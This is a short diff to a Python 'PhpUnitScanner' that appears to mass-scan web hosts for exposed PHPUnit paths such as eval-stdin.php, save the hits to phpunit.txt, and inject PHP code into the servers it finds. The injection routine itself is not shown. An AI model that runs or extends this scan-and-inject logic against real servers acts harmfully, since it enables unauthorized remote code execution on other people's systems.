@@ -92,7 +92,11 @@ class PhpUnitScanner:
                     url, found = future.result()
                     if found:
                         print(f"\033[32m[+] Found => {url}\033[0m")
-                        self.inject_php_code(url, endpoint.strip())
+                        # Save the valid path to phpunit.txt
+                        self.save(url, "phpunit.txt")
+                        # Proceed to inject PHP code only if the path is not eval-stdin.php
+                        if endpoint.strip() != 'eval-stdin.php':
+                            self.inject_php_code(url, endpoint.strip())
                 except Exception as e:
                     print(f"Error checking {web}: {e}")
 
